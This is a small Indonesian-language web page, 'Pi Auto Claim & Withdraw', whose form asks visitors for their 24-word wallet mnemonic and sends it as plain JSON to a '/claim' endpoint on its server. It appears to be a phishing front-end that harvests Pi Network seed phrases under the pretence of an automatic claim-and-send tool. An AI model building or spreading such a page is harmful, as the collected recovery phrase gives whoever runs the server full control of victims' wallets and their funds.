<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Pi Auto Claim</title>
</head>
<body>
  <h2>🚀 Pi Auto Claim & Withdraw</h2>
  <textarea id="mnemonic" rows="4" cols="80" placeholder="Masukkan 24 kata mnemonic"></textarea><br><br>
  <button onclick="submit()">CLAIM & KIRIM</button>
  <p id="status"></p>

  <script>
    async function submit() {
      const mnemonic = document.getElementById('mnemonic').value.trim();
      document.getElementById('status').innerText = 'Memproses...';

      const res = await fetch('/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mnemonic })
      });

      const data = await res.json();
      document.getElementById('status').innerText = data.message || data.error;
    }
  </script>
</body>
</html>
